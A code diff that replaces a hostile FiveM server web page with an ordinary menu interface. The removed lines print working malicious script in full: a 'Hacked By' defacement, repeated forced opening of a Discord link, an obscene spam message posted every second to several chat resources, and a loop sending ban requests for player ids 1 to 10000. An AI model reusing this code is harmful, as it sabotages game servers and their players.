@@ -1,193 +1,287 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>discord.gg/zx7</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background-color: #000;
-      font-family: 'Courier New', monospace;
-      overflow: hidden;
-      height: 100vh;
-      color: #fff;
-    }
-    #intro-image {
-      position: fixed; top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      z-index: 10;
-      background: url('https://i.postimg.cc/g2bCM2PS/image.webp') center center / cover no-repeat;
-      animation: fadeOut 2s ease-in-out forwards;
-      animation-delay: 2s;
-    }
-    @keyframes fadeOut {
-      to { opacity: 0; visibility: hidden; }
-    }
-    body::before {
-      content: "";
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') center center / cover no-repeat;
-      z-index: -2;
-      opacity: 0.4;
-      animation: moveBg 60s linear infinite;
-    }
-    @keyframes moveBg {
-      from { background-position: 0 0; }
-      to { background-position: 1000px 1000px; }
-    }
-    #main-content {
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      z-index: 1;
-    }
-    .text {
-      margin-top: 30px;
-      font-size: 2.5em;
-      font-weight: bold;
-      letter-spacing: 4px;
-      background: linear-gradient(90deg, #ff0000, #ff9900, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
-      background-size: 200% auto;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: gradientShift 6s linear infinite, glow 1.5s ease-in-out infinite;
-      text-shadow: 0 0 25px rgba(255,255,255,0.8);
-    }
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      100% { background-position: 100% 50%; }
-    }
-    @keyframes glow {
-      0% { text-shadow: 0 0 10px #00ffff; }
-      100% { text-shadow: 0 0 30px #00ffff; }
-    }
-    .center-gif {
-      animation: fadeIn 1s ease-in-out;
-    }
-    .center-gif img {
-      width: 600px;
-      border-radius: 15px;
-      box-shadow: 0 0 25px #fff;
-      animation: float 4s ease-in-out infinite;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FiveM Menu</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: transparent;
+            overflow: hidden;
+        }
+
+        .menu-container {
+            background: rgba(17, 24, 39, 0.95);
+            backdrop-filter: blur(8px);
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+        }
+
+        .menu-item {
+            transition: background-color 0.2s ease, transform 0.2s ease;
+        }
+
+        .menu-item:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+            transform: translateX(5px);
+        }
+
+        .menu-item.active {
+            background-color: rgba(59, 130, 246, 0.2);
+            border-left: 4px solid #3b82f6;
+        }
+
+        .submenu {
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .checkbox-container input:checked + .checkmark {
+            background-color: #3b82f6;
+            border-color: #3b82f6;
+        }
+
+        .slider {
+            -webkit-appearance: none;
+            appearance: none;
+            background: #4b5563;
+            height: 4px;
+            border-radius: 2px;
+        }
+
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 16px;
+            height: 16px;
+            background: #3b82f6;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .text-input {
+            transition: all 0.3s ease;
+        }
+
+        .text-input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+    </style>
 </head>
-<body>
-
-  <div id="intro-image"></div>
-
-  <div id="main-content">
-    <div class="center-gif">
-      <img src="https://cdn.discordapp.com/attachments/1249142946914111558/1402137495218421760/image.png?ex=68a9e40d&is=68a8928d&hm=f85b3330f22d0c64e68bce04d105faf49dca07cf6fc17c1b668de67f6b390f44&" alt="Dancing GIF">
+<body class="text-gray-200">
+    <div id="menu" class="menu-container w-80 max-h-[80vh] overflow-y-auto hidden absolute top-10 left-10">
+        <div id="menu-header" class="px-4 py-3 border-b border-gray-700">
+            <h1 class="text-lg font-bold text-white">FiveM Menu</h1>
+        </div>
+        <div id="menu-items" class="px-2 py-2"></div>
     </div>
-    <div class="text" id="typewriter"></div>
-  </div>
 
-  <audio id="bg-music" preload="auto" loop>
-    <source src="https://cdn.discordapp.com/attachments/1391195372222939307/1395301274269909082/Toms_Diner_Long_Version_DNA_feat._Suzanne_Vega_1990_1_1.mp3?ex=689b9153&is=689a3fd3&hm=aa814a3454d80fabd7f3de48cf553063d444388dc5e09aea113059629cdd008c&" type="audio/mpeg">
-  </audio>
+    <div id="text-input-container" class="hidden fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
+        <div class="bg-gray-900 rounded-lg p-6 w-96">
+            <h2 id="text-input-question" class="text-lg font-medium text-white mb-4"></h2>
+            <input
+                id="text-input"
+                type="text"
+                class="text-input w-full bg-gray-800 text-white border border-gray-600 rounded-lg px-4 py-2 focus:outline-none"
+                autocomplete="off"
+            >
+            <div class="mt-4 flex justify-end space-x-2">
+                <button id="text-input-cancel" class="px-4 py-2 bg-gray-700 text-white rounded-lg hover:bg-gray-600">Cancel</button>
+                <button id="text-input-submit" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-500">Submit</button>
+            </div>
+        </div>
+    </div>
 
-  <audio id="key-sound" preload="auto">
-    <source src="https://l.top4top.io/m_3504ar66b1.mp3" type="audio/mpeg">
-  </audio>
+    <script>
+        let currentMenu = [];
+        let currentIndex = 0;
+        let isMenuVisible = false;
+        let isTextInputVisible = false;
 
-  <script>
-    const audio = document.getElementById("bg-music");
-    const keySound = document.getElementById("key-sound");
-    const writer = document.getElementById("typewriter");
-    const text = "Hacked By Faisal and Shmri discord.gg/zx7";
-    let i = 0;
+        // Initialize WebSocket or NUI communication
+        window.addEventListener('message', (event) => {
+            const data = event.data;
+            switch (data.action) {
+                case 'setVisible':
+                    toggleMenu(data.visible);
+                    break;
+                case 'setCurrent':
+                    updateMenu(data.menu, data.current);
+                    break;
+                case 'openTextInput':
+                    openTextInput(data);
+                    break;
+                case 'closeTextInput':
+                    closeTextInput();
+                    break;
+                case 'updateTextInput':
+                    updateTextInput(data.value);
+                    break;
+                case 'requestClipboard':
+                    sendClipboardData();
+                    break;
+            }
+        });
 
-    setTimeout(() => {
-      document.getElementById("main-content").style.display = "flex";
-
-      audio.volume = 0;
-      audio.play();
-      let vol = 0;
-      const fadeIn = setInterval(() => {
-        if (vol < 1) {
-          vol += 0.01;
-          audio.volume = vol;
-        } else {
-          clearInterval(fadeIn);
+        function toggleMenu(visible) {
+            const menu = document.getElementById('menu');
+            menu.classList.toggle('hidden', !visible);
+            isMenuVisible = visible;
         }
-      }, 150);
 
-      function typeWriter() {
-        if (i < text.length) {
-          writer.innerHTML += text.charAt(i);
-          keySound.currentTime = 0;
-          keySound.play();
-          i++;
-          setTimeout(typeWriter, 100);
+        function updateMenu(menu, index) {
+            currentMenu = menu;
+            currentIndex = index;
+            const menuItems = document.getElementById('menu-items');
+            menuItems.innerHTML = '';
+
+            menu.forEach((item, i) => {
+                const div = document.createElement('div');
+                div.className = `menu-item px-4 py-2 rounded-lg flex items-center space-x-3 cursor-pointer ${i === index ? 'active' : ''}`;
+                
+                // Add icon if present
+                if (item.icon) {
+                    const icon = document.createElement('i');
+                    icon.className = `ph-${item.icon} text-blue-400`;
+                    div.appendChild(icon);
+                }
+
+                const label = document.createElement('span');
+                label.className = 'flex-grow';
+                label.textContent = item.label;
+                div.appendChild(label);
+
+                if (item.type === 'submenu') {
+                    const arrow = document.createElement('i');
+                    arrow.className = 'ph-caret-right text-gray-400';
+                    div.appendChild(arrow);
+                    div.onclick = () => sendMessage({ action: 'navigate', index: i });
+                } else if (item.type === 'button') {
+                    div.onclick = () => sendMessage({ action: 'confirm', index: i });
+                } else if (item.type === 'checkbox') {
+                    const checkboxContainer = document.createElement('div');
+                    checkboxContainer.className = 'checkbox-container';
+                    const checkbox = document.createElement('input');
+                    checkbox.type = 'checkbox';
+                    checkbox.checked = item.checked;
+                    checkbox.className = 'hidden';
+                    checkbox.id = `checkbox-${i}`;
+                    const checkmark = document.createElement('span');
+                    checkmark.className = 'checkmark w-5 h-5 border border-gray-400 rounded bg-gray-700 flex items-center justify-center';
+                    if (item.checked) {
+                        checkmark.innerHTML = '<i class="ph-check text-white"></i>';
+                    }
+                    checkbox.onchange = (e) => {
+                        checkmark.innerHTML = e.target.checked ? '<i class="ph-check text-white"></i>' : '';
+                        sendMessage({ action: 'confirm', index: i, value: e.target.checked });
+                    };
+                    checkboxContainer.appendChild(checkbox);
+                    checkboxContainer.appendChild(checkmark);
+                    div.appendChild(checkboxContainer);
+                } else if (item.type === 'slider') {
+                    const slider = document.createElement('input');
+                    slider.type = 'range';
+                    slider.className = 'slider w-full';
+                    slider.min = item.min;
+                    slider.max = item.max;
+                    slider.value = item.value;
+                    slider.oninput = (e) => sendMessage({ action: 'change', index: i, value: parseInt(e.target.value) });
+                    slider.onchange = (e) => sendMessage({ action: 'confirm', index: i, value: parseInt(e.target.value) });
+                    div.appendChild(slider);
+                } else if (item.type === 'scroll') {
+                    const select = document.createElement('select');
+                    select.className = 'bg-gray-700 text-white rounded-lg px-2 py-1';
+                    item.options.forEach((opt, optIndex) => {
+                        const option = document.createElement('option');
+                        option.value = opt.value;
+                        option.textContent = opt.label;
+                        if (optIndex === item.selected) option.selected = true;
+                        select.appendChild(option);
+                    });
+                    select.onchange = (e) => sendMessage({ action: 'confirm', index: i, value: e.target.value, selected: e.target.selectedIndex });
+                    div.appendChild(select);
+                }
+
+                menuItems.appendChild(div);
+            });
         }
-      }
-      typeWriter();
-    }, 2000);
 
-    setInterval(function() {
-      try {
-        window.invokeNative("openUrl", "https://discord.gg/zx7");
-      } catch (e) {
-        console.warn("invokeNative not available.");
-      }
-    }, 1000);
+        function openTextInput(data) {
+            const container = document.getElementById('text-input-container');
+            const input = document.getElementById('text-input');
+            const question = document.getElementById('text-input-question');
 
-    const msg = `👑نيكني فيصل وشمري تكفى - .gg/zx7 ! 👑`;
-    const body = JSON.stringify({ message: msg });
-    setInterval(() => {
-      fetch("https://flix-scripts/chatResult", { method: "POST", body });
-      fetch("https://danger_chat/Danger_Chat:SendMessage", {
-        method: "POST",
-        body: JSON.stringify({
-          message: msg,
-          channel: "شات العام",
-          color: null,
-          isImageAndLinksAllowed: [false, false]
-        })
-      });
-      fetch("https://easy-chat+/o6ZbK5Ecp6", {
-        headers: {
-          accept: "*/*",
-          "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-        },
-        body: JSON.stringify({ message: msg, channel: "شات العام" }),
-        method: "POST"
-      });
-      fetch("https://melix_chat/chatResult", { method: "POST", body });
-      fetch("https://as_chat/chatResult", { method: "POST", body });
-      fetch("https://chat/chatResult", { method: "POST", body });
-      fetch("https://ho-chatv2/Chat", {
-        method: "POST",
-        body: JSON.stringify({
-          Type: "chatResult",
-          message: msg,
-          chatType: "general"
-        })
-      });
-    }, 1000);
+            question.textContent = data.question;
+            input.placeholder = data.placeholder;
+            input.value = data.value;
+            input.maxLength = data.maxLength;
+            input.type = data.inputType === 'numeric' ? 'number' : 'text';
+            container.classList.remove('hidden');
+            isTextInputVisible = true;
+            input.focus();
 
-    // From second script block
-    for (let i = 1; i <= 10000; i++) {
-      setTimeout(() => {
-        $.post('https://ec-panel/BanPlayer', JSON.stringify({
-          id: i,
-          Reason: "By Faisal Discord.gg/ZX7"
-        }));
-      }, i * 50);
-    }
-  </script>
+            // Prevent form submission on Enter
+            input.onkeydown = (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    sendMessage({ action: 'submitText', value: input.value });
+                } else if (e.key === 'Escape') {
+                    sendMessage({ action: 'cancelText' });
+                }
+            };
 
+            document.getElementById('text-input-cancel').onclick = () => sendMessage({ action: 'cancelText' });
+            document.getElementById('text-input-submit').onclick = () => sendMessage({ action: 'submitText', value: input.value });
+        }
+
+        function closeTextInput() {
+            const container = document.getElementById('text-input-container');
+            const input = document.getElementById('text-input');
+            container.classList.add('hidden');
+            input.value = '';
+            isTextInputVisible = false;
+        }
+
+        function updateTextInput(value) {
+            const input = document.getElementById('text-input');
+            input.value = value;
+        }
+
+        function sendClipboardData() {
+            if (navigator.clipboard) {
+                navigator.clipboard.readText().then(text => {
+                    sendMessage({ action: 'clipboardData', value: text });
+                }).catch(err => {
+                    console.error('Failed to read clipboard:', err);
+                    sendMessage({ action: 'clipboardData', value: '' });
+                });
+            } else {
+                sendMessage({ action: 'clipboardData', value: '' });
+            }
+        }
+
+        function sendMessage(data) {
+            window.postMessage(data, '*');
+        }
+
+        // Prevent default form behavior
+        document.addEventListener('submit', (e) => e.preventDefault());
+    </script>
 </body>
 </html>
